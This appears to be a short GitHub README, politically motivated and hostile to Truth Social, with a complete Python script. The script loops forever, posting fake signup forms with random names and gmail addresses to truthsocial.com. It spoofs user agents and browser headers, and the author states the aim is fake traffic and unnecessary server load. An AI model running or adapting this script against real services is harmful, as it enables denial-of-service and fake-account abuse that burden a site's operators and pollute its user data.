# FuckTruthSocial
It really seems like Trump is trying to get his own social media started. Not a huge fan tbh. (When TruthSocial actually releases, I'll update the script to spam fake sighnups to the site to generate fake traffic and put un-necessary load on their servers.)

```py
py postspammer.py
```
Very simple, not much to explain, but I'll put the code here anyway:
```py
import requests
import json
import string
import random
from user_agent import generate_user_agent #pip install user_agent

truthsocial = "https://www.truthsocial.com/"
count = 0

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
while True:
    headers = {
        'User-Agent': f'{generate_user_agent()}',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.truthsocial.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.truthsocial.com',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'TE': 'trailers',
    }
    d = {'first_name': id_generator(), 'last_name': id_generator(), 'email' : f'{id_generator()}@gmail.com', 'phone': '', 'offers': 'on'}
    w = requests.post(truthsocial, data=d, headers=headers)
    count += 1
    print(count)
```
